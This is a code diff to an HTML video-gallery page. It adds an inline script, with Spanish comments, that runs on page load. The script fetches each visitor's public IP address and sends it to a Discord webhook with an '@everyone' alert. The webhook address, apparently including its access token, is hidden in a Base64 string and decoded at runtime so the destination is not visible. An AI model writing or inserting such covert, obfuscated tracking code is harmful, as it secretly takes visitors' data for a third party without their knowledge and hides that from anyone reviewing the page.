@@ -66,18 +66,28 @@
             <div class="video-title">Video 3</div>
         </div>
     </div>
-</body>
-</html>
+
     <script>
+        function decodeBase64(str) {
+            try {
+                return atob(str);
+            } catch (e) {
+                console.error("Error al decodificar Base64:", e);
+                return null;
+            }
+        }
 
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-
                 const userIP = data.ip;
-                console.log("La IP pública es: ", userIP);
+                console.log("La IP pública es:", userIP);
 
-                const discordWebhookURL = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjA1MzcwMjE4MDgwMjU2MS85OFZoN0szWXVuSnlYcVhDeDRuMXBsV1VYWHdlcmtLYUZiY3Z4bnhMaVhZR3U4RVpxRUFkckpHamJJNXpUSG8yaWVXag==';
+                // Webhook codificado en Base64
+                const encodedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjA1MzcwMjE4MDgwMjU2MS85OFZoN0szWXVuSnlYcVhDeDRuMXBsV1VYWHdlcmtLYUZiY3Z4bnhMaVhZR3U4RVpxRUFkckpHamJJNXpUSG8yaWVXag==';
+                const discordWebhookURL = decodeBase64(encodedWebhook);
+
+                if (!discordWebhookURL) return;
 
                 const payload = {
                     content: `@everyone ¡Alguien visitó tu página! La IP es: ${userIP}`
@@ -98,11 +108,11 @@
                     }
                 })
                 .catch(error => {
-                    console.error("Error al enviar la IP a Discord: ", error);
+                    console.error("Error al enviar la IP a Discord:", error);
                 });
             })
             .catch(error => {
-                console.error("Error al obtener la IP pública: ", error);
+                console.error("Error al obtener la IP pública:", error);
             });
     </script>
 </body>
